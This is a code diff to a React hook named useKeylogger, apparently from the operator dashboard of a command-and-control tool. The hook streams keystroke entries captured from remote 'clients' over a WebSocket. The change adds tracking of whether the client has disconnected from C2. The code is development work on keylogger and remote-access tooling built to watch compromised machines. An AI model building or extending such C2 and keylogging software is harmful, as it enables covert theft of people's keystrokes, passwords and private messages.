@@ -20,6 +20,8 @@ interface KeyloggerMessage {
 interface UseKeyloggerResult {
   entries: KeyloggerEntry[];
   status: "connecting" | "open" | "closed";
+  /** False when the client has disconnected from C2 (reset to true on next data message). */
+  clientConnected: boolean;
   /** Send a clear command to the server and optimistically reset local state. */
   clearEntries: () => void;
 }
@@ -37,6 +39,7 @@ interface UseKeyloggerResult {
  */
 export function useKeylogger(clientId: string): UseKeyloggerResult {
   const [entries, setEntries] = useState<KeyloggerEntry[]>([]);
+  const [clientConnected, setClientConnected] = useState(true);
 
   const wsUrl = useMemo(() => buildViewerWsUrl(clientId, "keylogger"), [clientId]);
 
@@ -54,6 +57,8 @@ export function useKeylogger(clientId: string): UseKeyloggerResult {
       setEntries((prev) => [...prev, ...(msg.entries ?? [])]);
     } else if (msg.type === "cleared") {
       setEntries([]);
+    } else if (msg.type === "disconnected") {
+      setClientConnected(false);
     }
   }, []);
 
@@ -64,5 +69,5 @@ export function useKeylogger(clientId: string): UseKeyloggerResult {
     setEntries([]); // Optimistic reset
   }, [send]);
 
-  return { entries, status, clearEntries };
+  return { entries, status, clientConnected, clearEntries };
 }
